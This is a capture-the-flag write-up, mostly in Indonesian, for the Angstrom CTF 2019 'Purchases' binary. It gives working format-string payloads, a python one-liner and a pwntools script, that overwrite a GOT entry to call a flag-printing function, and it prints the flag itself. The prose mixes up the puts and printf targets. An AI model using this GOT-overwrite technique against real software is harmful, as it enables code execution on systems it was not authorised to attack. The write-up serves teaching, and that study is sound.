# __Angstrom CTF 2019__ 
## _Purchases_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Binary | 120 | l0l

**Description:** 

> 120 points 98 solves
>
> nc shell.actf.co 19011
>
> Author: defund
>
> Given : [binary](./purchases) and [source](./purchases.c)


### Purchases
```
purchases: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=81d703c9e71c8e60af8bdd4515f6bada05bcbcf8, not stripped

gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

```

0x00000000004011b6  flag
0x00000000004011c9  main
```

### Pie Shop Source Code
```c
void flag() {
	system("/bin/cat flag.txt");
}

int main() {
...
	char item[60];
	printf("What item would you like to purchase? ");
	fgets(item, sizeof(item), stdin);
	item[strlen(item)-1] = 0;

	if (strcmp(item, "nothing") == 0) {
		printf("Then why did you even come here? ");
	} else {
		printf("You don't have any money to buy ");
		printf(item);
		printf("s. You're wasting your time! We don't even sell ");
		printf(item);
		printf("s. Leave this place and buy ");
		printf(item);
		printf(" somewhere else. ");
	}
...
```

### Solve
Dari source code terlihat jelas disini kita punya format string vulnerability selama input kita bukan "nothing". Tujuannya jelas memanggil fungsi `flag`.
```
   0x000000000040131a <+337>:   call   0x401080 <printf@plt>
   0x000000000040131f <+342>:   lea    rdi,[rip+0xdda]        # 0x402100
   0x0000000000401326 <+349>:   call   0x401030 <puts@plt>
   0x000000000040132b <+354>:   mov    eax,0x0
```
Tepat setelah printf ternyata ada fungsi `puts`. Kita dapat overwrite GOT agar ketika memanggil `puts` kita justru masuk ke funsgi `flag`.

Dengan sedikit trial and error, diketahui bahwa input kita akan menjadi argumen ke-8 dan seterusnya dari printf.
```
What item would you like to purchase? AAAAAAAA%8$p
You don't have any money to buy AAAAAAAA0x4141414141414141s. You're wasting your time! We don't even sell AAAAAAAA0x4141414141414141s. Leave this place and buy AAAAAAAA0x4141414141414141 somewhere else. Get out!
```

Address puts : 0x404018
```
gdb-peda$ pdisass 0x401030
Dump of assembler code from 0x401030 to 0x401050::      Dump of assembler code from 0x401030 to 0x401050:
   0x0000000000401030 <puts@plt+0>:     jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <puts@got.plt>

gdb-peda$ x 0x404018
0x404018 <puts@got.plt>:        0x00401036
```

Kita harus memasukkan address `flag` (0x00000000004011b6) ke 0x401030.


### Payload
Cara bodoh :v
```bash
python -c "print '%4198838u%11\$n          \x18\x40\x40'" | nc shell.actf.co 19011
```

Cara lumayan smart 
```py
from pwn import *
elf = ELF('./purchases')
printf_address = elf.symbols['got.printf']
flag = elf.symbols['flag']			# Get the function flag() address
flag = str(flag)					# Convert to string
payload = '%' + flag + 'x%10$ln'	# Using ln because of 8 bytes address
# p = elf.process()
p = remote('shell.actf.co',19011)
p.recvuntil("purchase? ")
p.sendline(payload.rjust(16)+p64(printf_address)[:3])
p.interactive()
```

### Flag 
actf{limited_edition_flag}